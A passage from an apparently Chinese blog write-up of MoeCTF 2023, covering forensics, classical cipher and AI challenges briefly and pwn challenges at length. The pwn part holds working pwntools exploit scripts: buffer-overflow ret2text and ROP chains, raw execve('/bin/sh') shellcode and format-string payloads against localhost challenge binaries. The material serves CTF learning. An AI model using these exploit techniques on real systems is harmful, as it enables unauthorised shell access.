class="hljs-string">&#x27;ok&#x27;</span>, <span class="hljs-string">&#x27;aof_last_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;module_fork_in_progress&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;module_fork_last_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_connections_received&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;total_commands_processed&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;instantaneous_ops_per_sec&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_net_input_bytes&#x27;</span>: <span class="hljs-number">124</span>, <span class="hljs-string">&#x27;total_net_output_bytes&#x27;</span>: <span class="hljs-number">172</span>, <span class="hljs-string">&#x27;instantaneous_input_kbps&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;instantaneous_output_kbps&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;rejected_connections&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;sync_full&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;sync_partial_ok&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;sync_partial_err&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;expired_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;expired_stale_perc&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;expired_time_cap_reached_count&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;expire_cycle_cpu_milliseconds&#x27;</span>: <span class="hljs-number">176</span>, <span class="hljs-string">&#x27;evicted_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;keyspace_hits&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;keyspace_misses&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;pubsub_channels&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;pubsub_patterns&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;latest_fork_usec&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_forks&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;migrate_cached_sockets&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;slave_expires_tracked_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_hits&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_misses&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_key_hits&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_key_misses&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_total_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_total_items&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_total_prefixes&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;unexpected_error_replies&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_error_replies&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;dump_payload_sanitizations&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_reads_processed&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;total_writes_processed&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;io_threaded_reads_processed&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;io_threaded_writes_processed&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;master&#x27;</span>, <span class="hljs-string">&#x27;connected_slaves&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;master_failover_state&#x27;</span>: <span class="hljs-string">&#x27;no-failover&#x27;</span>, <span class="hljs-string">&#x27;master_replid&#x27;</span>: <span class="hljs-string">&#x27;72bf10998fb01f8851a13c92aaf4ccbbed81ab83&#x27;</span>, <span class="hljs-string">&#x27;master_replid2&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;master_repl_offset&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;second_repl_offset&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;repl_backlog_active&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;repl_backlog_size&#x27;</span>: <span class="hljs-number">1048576</span>, <span class="hljs-string">&#x27;repl_backlog_first_byte_offset&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;repl_backlog_histlen&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;used_cpu_sys&#x27;</span>: <span class="hljs-number">6.963199</span>, <span class="hljs-string">&#x27;used_cpu_user&#x27;</span>: <span class="hljs-number">8.13399</span>, <span class="hljs-string">&#x27;used_cpu_sys_children&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;used_cpu_user_children&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;used_cpu_sys_main_thread&#x27;</span>: <span class="hljs-number">6.965816</span>, <span class="hljs-string">&#x27;used_cpu_user_main_thread&#x27;</span>: <span class="hljs-number">8.12967</span>, <span class="hljs-string">&#x27;errorstat_ERR&#x27;</span>: <span class="hljs-string">&#x27;count=2&#x27;</span>, <span class="hljs-string">&#x27;cluster_enabled&#x27;</span>: <span class="hljs-number">0</span>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/guo15890025019/article/details/116994677">https://blog.csdn.net/guo15890025019/article/details/116994677</a><br>未完待续……….（咕咕咕</p><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h3 id="随身携带的虚拟机"><a href="#随身携带的虚拟机" class="headerlink" title="随身携带的虚拟机"></a>随身携带的虚拟机</h3><p>vm挂载vmdk，windows10系统<br>打开后回收站里有key，用key打开锁上的磁盘即可</p><h3 id="坚持访问的浏览器"><a href="#坚持访问的浏览器" class="headerlink" title="坚持访问的浏览器"></a>坚持访问的浏览器</h3><p><img src="/mdimg/moectf2023/45.png"><br><img src="/mdimg/moectf2023/46.png"></p><h3 id="锁定起来的同人文"><a href="#锁定起来的同人文" class="headerlink" title="锁定起来的同人文"></a>锁定起来的同人文</h3><p><img src="/mdimg/moectf2023/47.png"><br><img src="/mdimg/moectf2023/48.png"><br>挂载vc<br><code>&quot;L:\data\20230707221115-ibr7vs7\20230707221136-xyfn5al\20230707221147-1rzo2wp\20230707221158-6te2bxl.sy&quot;</code><br><img src="/mdimg/moectf2023/49.png"><br>base32<code>moectf&#123;S0_d33ply_H1dden!&#125; </code></p><h1 id="classical-Crypto"><a href="#classical-Crypto" class="headerlink" title="classical Crypto"></a>classical Crypto</h1><h3 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a>不是“皇帝的新密码”</h3><p>维吉尼亚，根据flag格式，用key <code>moectf&#123;</code>解维吉尼亚得到开头为<code>goodjo</code>猜测key为<code>goodjob</code>解密即可</p><h3 id="猫言喵语"><a href="#猫言喵语" class="headerlink" title="猫言喵语"></a>猫言喵语</h3><p><code>喵喵？</code>–》<code>-</code> <code>喵喵喵</code>–》<code>.</code><br><img src="/mdimg/moectf2023/50.png"></p><h3 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h3><p>rot47</p><h3 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h3><p><img src="/mdimg/moectf2023/51.png"></p><h3 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h3><p>凯撒7</p><h1 id="Ai"><a href="#Ai" class="headerlink" title="Ai"></a>Ai</h1><h3 id="EZ-MLP"><a href="#EZ-MLP" class="headerlink" title="EZ MLP"></a>EZ MLP</h3><p><img src="/mdimg/moectf2023/52.png"><br>调换即可<br><code>moectf&#123;fR13NdsHlP_15_M491C!&#125;</code></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h3 id="ret2text-32"><a href="#ret2text-32" class="headerlink" title="ret2text_32"></a>ret2text_32</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>str_binsh_addr = <span class="hljs-number">0x804C02C</span><br>sys_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">50227</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;What\&#x27;s your age?&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;200&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Now..try to overflow!&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x58</span> + <span class="hljs-number">0x4</span>) + p32(sys_plt) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(str_binsh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="baby-calculator"><a href="#baby-calculator" class="headerlink" title="baby_calculator"></a>baby_calculator</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>X = pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">50677</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   tmp = X.recvline()<br>   <span class="hljs-built_in">print</span>(tmp.decode())<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;The first:&#x27;</span> <span class="hljs-keyword">in</span> tmp:<br>      x=tmp.decode().index(<span class="hljs-string">&#x27;t&#x27;</span>)<br>      res1=tmp.decode()[x+<span class="hljs-number">2</span>:]<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;The second:&#x27;</span><span class="hljs-keyword">in</span> tmp:<br>      res2=tmp.decode()[<span class="hljs-number">11</span>:]<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;=&#x27;</span> <span class="hljs-keyword">in</span> tmp:<br>      val=tmp.decode()[<span class="hljs-built_in">len</span>(res1)+<span class="hljs-built_in">len</span>(res2):]<br>      <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(res1.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>))+<span class="hljs-built_in">int</span>(res2)==<span class="hljs-built_in">int</span>(val)):<br>        data1=<span class="hljs-string">&quot;BlackBird&quot;</span>.encode()<br>        X.sendline(data1)<br>      <span class="hljs-keyword">else</span>:<br>        data2=<span class="hljs-string">&quot;WingS&quot;</span>.encode()<br>        X.sendline(data2)<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!You finish&#x27;</span> <span class="hljs-keyword">in</span> tmp:<br>      X.interactive()<br>      tmp = X.recvline()<br>      <span class="hljs-built_in">print</span>(tmp.decode())<br></code></pre></td></tr></table></figure><h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><p>整形溢出<br><img src="/mdimg/moectf2023/a.png"><br>int 的取值范围 <code>-2147483648～2147483647</code><br>-114514=<code>2147483647</code>+1+2147483648-114514<br>v1=4294852782</p><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p><img src="/mdimg/moectf2023/b.png"><br>fd2=4*1|0x29A=670</p><h3 id="ret2text-64"><a href="#ret2text-64" class="headerlink" title="ret2text_64"></a>ret2text_64</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>re = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">00000</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>binsh = <span class="hljs-number">0x404050</span><br>system_plt = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>system_plt2 = <span class="hljs-number">0x4012B7</span><br>rdi_ret = <span class="hljs-number">0x4011be</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">88</span> + p64(rdi_ret) + p64(binsh) + p64(system_plt2)<br><br><span class="hljs-built_in">print</span>(re.recv(<span class="hljs-number">4096</span>).decode())<br>re.sendline(<span class="hljs-string">&#x27;120&#x27;</span>.encode())<br><br><span class="hljs-built_in">print</span>(re.recv(<span class="hljs-number">4096</span>).decode())<br>re.sendline(payload)<br>re.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="shellcode-level0"><a href="#shellcode-level0" class="headerlink" title="shellcode_level0"></a>shellcode_level0</h3><p><img src="/mdimg/moectf2023/c.png"><br>网上找到shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">34897</span>)<br>shellcode=<span class="hljs-string">&#x27;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&#x27;</span><br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/moectf2023/d.png"></p><h3 id="uninitialized-key"><a href="#uninitialized-key" class="headerlink" title="uninitialized_key"></a>uninitialized_key</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">42085</span>)<br>#p = process(<span class="hljs-string">&#x27;./uninitialized_key&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;114514&quot;</span>)<br>gdb.attach(p)<br>p.sendline(<span class="hljs-string">&quot;\x00&quot;</span>)#或者就直接留空。p.sendline(<span class="hljs-string">&quot;&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="format-level0"><a href="#format-level0" class="headerlink" title="format_level0"></a>format_level0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>,<span class="hljs-number">17</span>):<br>    p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">32809</span>)<br>    <span class="hljs-comment"># p = process(&#x27;./format_level0&#x27;)</span><br><br>    <span class="hljs-comment"># gdb.attach(p)</span><br>    p.sendline(<span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;i&#125;</span>$p&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br><br>    byte_str = binascii.unhexlify(p.recvline()[:-<span class="hljs-number">1</span>])<br>    str_result = byte_str.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    flag+=str_result[::-<span class="hljs-number">1</span>]<br><br>    p.close()<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h3 id="PIE-enabled"><a href="#PIE-enabled" class="headerlink" title="PIE_enabled"></a>PIE_enabled</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import *<br><br><span class="hljs-built_in">context</span>.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">45993</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>leak = int(p.recvline()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><span class="hljs-keyword">base_add </span>= leak - <span class="hljs-number">0x1245</span><br>system_add = <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x10A0</span><br><span class="hljs-keyword">bash </span>= <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x4010</span><br>pop_rdi = <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x0000000000001323</span><br>ret = <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x128D</span><br>success(hex(<span class="hljs-keyword">base_add))</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment"># gdb.attach(p)</span><br>paylaod = <span class="hljs-keyword">b&#x27;a&#x27; </span>* <span class="hljs-number">0x58</span> + p64(pop_rdi) + p64(<span class="hljs-keyword">bash) </span>+ p64(ret) + p64(system_add)<br>p.sendline(paylaod)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="shellcode-level1"><a href="#shellcode-level1" class="headerlink" title="shellcode_level1"></a>shellcode_level1</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br># p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">54369</span>)<br>p = process(<span class="hljs-string">&#x27;./shellcode_level1&#x27;</span>)<br># gdb.attach(p)<br>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>payload = asm(shellcraft.sh())<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Uninitialized-key-plus"><a href="#Uninitialized-key-plus" class="headerlink" title="Uninitialized_key_plus"></a><strong>Uninitialized_key_plus</strong></h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">33067</span>)<br># p = process(<span class="hljs-string">&#x27;./uninitialized_key_plus&#x27;</span>)<br><br>payload = b<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">20</span> + p32(<span class="hljs-number">0x1BF52</span>)<br>p.sendline(payload)<br>p.sendline(b<span class="hljs-string">&quot;\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="format-level1"><a href="#format-level1" class="headerlink" title="format_level1"></a>format_level1</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br># context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">33853</span>)<br># p = process(<span class="hljs-string">&#x27;./format_level1&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>payload = b<span class="hljs-string">&quot;%8$n&quot;</span> + p64(<span class="hljs-number">0x804c00c</span>)<br>p.sendline(payload)<br># gdb.attach(p)<br>p.sendline(b<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="rePWNse"><a href="#rePWNse" class="headerlink" title="rePWNse"></a>rePWNse</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">35899</span>)<br># p = process(<span class="hljs-string">&#x27;./rePWNse&#x27;</span>)<br><br><br>pop_rdi = <span class="hljs-number">0x000000000040168e</span><br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)            #<span class="hljs-number">7</span><br>p.sendline(<span class="hljs-string">&quot;9&quot;</span>)        #<span class="hljs-number">8</span><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)            #<span class="hljs-number">9</span><br>p.sendline(<span class="hljs-string">&quot;9&quot;</span>)        #<span class="hljs-number">10</span><br>p.sendline(<span class="hljs-string">&quot;8&quot;</span>)            #<span class="hljs-number">11</span><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)            #<span class="hljs-number">12</span><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)            #<span class="hljs-number">13</span><br><br>p.recvuntil(<span class="hljs-string">&quot;address is:&quot;</span>)<br>leak = int(p.recvline()[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>],<span class="hljs-number">16</span>)<br># gdb.attach(p)<br>payload = b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi)+p64(leak)+p64(<span class="hljs-number">0x401296</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="changeable-shellcode"><a href="#changeable-shellcode" class="headerlink" title="changeable_shellcode"></a>changeable_shellcode</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br><br>from ctypes import *<br><br># context<span class="hljs-number">.</span>log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context<span class="hljs-number">.</span>arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">34369</span>)<br># p = process(<span class="hljs-string">&#x27;./shellcode&#x27;</span>)<br><br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rax</span>+<span class="hljs-number">33</span>], <span class="hljs-number">5</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x68732f2f6e69622f</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">59</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p<span class="hljs-number">.</span>sendline(asm(shellcode)+b<span class="hljs-string">&#x27;\x0f&#x27;</span>)<br><br>p<span class="hljs-number">.</span>interactive()<br></code></pre></td></tr></table></figure><h3 id="format-level2"><a href="#format-level2" class="headerlink" title="format_level2"></a>format_level2</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 